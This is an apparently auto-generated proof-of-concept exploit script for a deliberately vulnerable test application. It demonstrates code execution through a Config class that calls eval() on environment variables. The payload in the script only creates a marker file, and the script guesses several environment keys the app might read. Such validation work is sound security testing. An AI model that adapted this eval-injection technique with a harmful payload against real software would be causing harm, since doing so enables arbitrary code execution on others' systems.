#!/usr/bin/env python3
# PoC for vuln-test-app (/tmp/vuln-test-app)
# Path: rce-006
# Sink: get
# Auto-generated — run with: python3 rce_if_control_environment_variable_get.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in vuln-test-app (/tmp/vuln-test-app).

Vulnerability: The Config class uses eval() on environment variable values.
If an attacker can control environment variables (e.g., via a compromised
environment or misconfiguration), they can execute arbitrary Python code.

This PoC demonstrates the vulnerability by setting a malicious environment
variable and triggering the vulnerable code path. It uses a benign payload
that creates a marker file to confirm code execution.

Usage:
    python3 poc.py [--target TARGET_URL]

Note: This exploit requires the ability to set environment variables before
running the target application, or the target must be configured to read
environment variables from an attacker-controlled source.
"""

import os
import sys
import subprocess
import tempfile
import argparse
import time
import signal

# Configuration
TARGET_APP = "/tmp/vuln-test-app"
MARKER_FILE = "/tmp/poc_success.txt"
BENIGN_PAYLOAD = f"__import__('os').system('touch {MARKER_FILE}')"

def check_prerequisites():
    """Verify that the target application exists and is executable."""
    if not os.path.exists(TARGET_APP):
        print(f"[!] Target application not found at {TARGET_APP}")
        print("[*] Please ensure vuln-test-app is built and available")
        return False
    
    if not os.access(TARGET_APP, os.X_OK):
        print(f"[!] Target application is not executable: {TARGET_APP}")
        return False
    
    return True

def run_exploit(target_url=None):
    """
    Execute the RCE exploit by setting a malicious environment variable
    and running the vulnerable application.
    
    The exploit works by:
    1. Setting the environment variable that Config.get() will read
    2. Running the target application which will call eval() on our payload
    3. Checking if the marker file was created (indicating successful RCE)
    """
    print("[*] Setting up exploit environment...")
    
    # Clean up any previous marker file
    if os.path.exists(MARKER_FILE):
        os.remove(MARKER_FILE)
    
    # Set the malicious environment variable
    # The Config class reads from environment variables and calls eval()
    # We need to find which key the application uses, but for demonstration
    # we'll set a common config key that triggers the vulnerable code path
    malicious_env = os.environ.copy()
    
    # The vulnerable code in config.py does:
    # value = os.environ.get(key)
    # if value is None:
    #     return default
    # return eval(value)
    #
    # We need to set an environment variable that the application will read.
    # Common config keys might include: DEBUG, CONFIG, SETTINGS, etc.
    # For this PoC, we'll set multiple potential keys to increase chances
    malicious_env["DEBUG"] = BENIGN_PAYLOAD
    malicious_env["CONFIG"] = BENIGN_PAYLOAD
    malicious_env["SETTINGS"] = BENIGN_PAYLOAD
    malicious_env["APP_CONFIG"] = BENIGN_PAYLOAD
    
    print(f"[*] Benign payload: {BENIGN_PAYLOAD}")
    print("[*] Payload will create marker file:", MARKER_FILE)
    
    # Run the target application with the malicious environment
    print("[*] Executing target application with malicious environment...")
    
    try:
        # Run the application and capture output
        process = subprocess.Popen(
            [TARGET_APP],
            env=malicious_env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        # Give it a moment to execute
        try:
            stdout, stderr = process.communicate(timeout=5)
            print(f"[*] Application stdout: {stdout}")
            print(f"[*] Application stderr: {stderr}")
        except subprocess.TimeoutExpired:
            print("[*] Application timed out (expected for some payloads)")
            process.kill()
            stdout, stderr = process.communicate()
        
        # Check if the exploit was successful
        if os.path.exists(MARKER_FILE):
            print("[+] SUCCESS! Marker file created at:", MARKER_FILE)
            print("[+] Code execution confirmed!")
            
            # Clean up the marker file
            os.remove(MARKER_FILE)
            return True
        else:
            print("[-] Marker file not found. Exploit may have failed.")
            print("[*] The application might not have read the environment variable")
            print("[*] or the vulnerable code path was not triggered.")
            return False
            
    except FileNotFoundError:
        print(f"[!] Could not execute {TARGET_APP}")
        return False
    except Exception as e:
        print(f"[!] Error during exploit: {e}")
        return False

def demonstrate_remote_exploit(target_url):
    """
    Demonstrate how this vulnerability could be exploited remotely if the
    application exposes the vulnerable functionality via a web interface.
    
    Note: This is a conceptual demonstration. The actual remote exploitation
    depends on how the application exposes the Config class functionality.
    """
    print("\n[*] Remote exploitation scenario:")
    print("[*] If the application exposes Config.get() via an API endpoint,")
    print("[*] an attacker could potentially trigger the eval() by sending")
    print("[*] requests that cause the application to read environment variables.")
    print("[*]")
    print("[*] Example attack vector:")
    print("[*] 1. Find an endpoint that uses Config.get()")
    print("[*] 2. Manipulate the environment (e.g., via HTTP headers, cookies)")
    print("[*] 3. Trigger the vulnerable code path")
    print("[*]")
    print("[*] For this specific application, the get_user_profile() function")
    print("[*] does not directly use Config, but other parts of the application")
    print("[*] might. The vulnerability is in the Config class itself.")
    
    if target_url:
        print(f"\n[*] Target URL: {target_url}")
        print("[*] Attempting remote exploitation...")
        
        try:
            import requests
            
            # Try to access the application
            response = requests.get(target_url, timeout=5)
            print(f"[*] Response status: {response.status_code}")
            print(f"[*] Response body: {response.text[:500]}")
            
        except requests.exceptions.ConnectionError:
            print("[!] Could not connect to target URL")
        except Exception as e:
            print(f"[!] Error: {e}")

def main():
    """Main entry point for the PoC script."""
    parser = argparse.ArgumentParser(
        description="PoC exploit for RCE in vuln-test-app via eval() on environment variables"
    )
    parser.add_argument(
        "--target",
        help="Target URL for remote exploitation (optional)",
        default=None
    )
    parser.add_argument(
        "--local",
        action="store_true",
        help="Run local exploitation (default if no target specified)",
        default=True
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("RCE Exploit PoC for vuln-test-app")
    print("=" * 60)
    print()
    
    # Check prerequisites
    if not check_prerequisites():
        print("[!] Prerequisites not met. Exiting.")
        sys.exit(1)
    
    # Run the exploit
    success = run_exploit(args.target)
    
    # Demonstrate remote exploitation if target URL provided
    if args.target:
        demonstrate_remote_exploit(args.target)
    
    print()
    print("=" * 60)
    if success:
        print("[+] Exploit completed successfully!")
        print("[+] The vulnerability is confirmed exploitable.")
    else:
        print("[-] Exploit did not produce expected results.")
        print("[*] This may be due to:")
        print("[*] - The application not reading the environment variable we set")
        print("[*] - The vulnerable code path not being triggered")
        print("[*] - The application having additional protections")
        print("[*]")
        print("[*] Try modifying the environment variable keys to match")
        print("[*] what the application actually reads.")
    print("=" * 60)

if __name__ == "__main__":
    main()
